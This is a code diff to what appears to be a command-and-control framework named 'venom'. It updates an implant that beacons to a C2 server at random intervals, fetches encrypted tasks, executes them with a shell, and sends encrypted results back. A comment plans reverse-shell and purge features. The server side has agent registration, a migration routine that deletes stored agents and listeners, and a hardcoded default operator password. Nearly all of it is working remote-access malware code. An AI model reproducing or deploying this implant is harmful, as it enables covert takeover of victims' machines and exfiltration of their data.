@@ -11,7 +11,7 @@ To-Do:
 3- Check how os.popen supports stderr return
 '''
 
-def registerAgent(agentID, type, bindListenerID, ip, port, timeout=86400):
+def registerAgent(agentID, type, bindListenerID, ip, port, timeout = 60):
 
     agent = {'id': agentID, 
              'port': port,
@@ -131,6 +131,14 @@ def getAgentListener(agentID):
             '$eq': agentID}
     }).get('bindListenerID')
 
+def getAgent(agentID): 
+    return db.agents.find_one({ 
+        'id': { 
+            '$eq': agentID
+        }
+
+    }) 
+
 def getAgents():
     return db.agents.find()
 
@@ -149,6 +157,7 @@ from random import seed
 from random import randint
 from time import sleep
 import os
+import subprocess
 #encryption libraries
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -190,8 +199,7 @@ if __name__ == "__main__":
     while (True): 
         seed()
         sleep(randint(0,20)) 
-        response = r.get(url= _C2_ + "/reg/{}".format(_ID_)) 
-        
+        response = r.get(url= _C2_ + "/reg/{}".format(_ID_))  
         if ("Success" in response.text): 
             break 
         
@@ -205,14 +213,15 @@ if __name__ == "__main__":
         task = r.get(url= _C2_ + "/task/{}".format(_ID_)) 
         #add aliases for reverse shell and purging  
         if (task.text): 
-            #decrypting data bfore executing command
-            cmd = decrypt(task.text)
-            result = os.popen('echo "{}" | sh'.format(cmd)).read()
-            
-            if (result): 
-                result = encrypt(result)
-            else: 
-                result = encrypt("Task didn't return a result") 
+            cmd = subprocess.Popen(decrypt(task.text), shell = True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
+            output,err = cmd.communicate()
+            if(output.decode('UTF-8') != ''):
+                result = output.decode('UTF-8')
+            elif (err.decode('UTF-8') != ''): 
+                result = err.decode('UTF-8')
+            else:
+                result = "Task completed but has no output"
+            result = encrypt(result)
             
             r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data = result.encode('ascii')) 
          
@@ -303,6 +312,8 @@ sleep $n
 } }'''
 
 def migrate(): 
+    db.listeners.delete_many({}) 
+    db.agents.delete_many({})
     if not db.operators.find_one({'email': {'$eq': 'venom@venom.local'}, 'password': {'$eq': sha256('venom1234'.encode('utf-8')).hexdigest()}}): 
         print("Creating a default password! 😍 ... Make sure to change it\nUsername: venom \nPassword: venom1234")
         db.operators.insert_one({ 
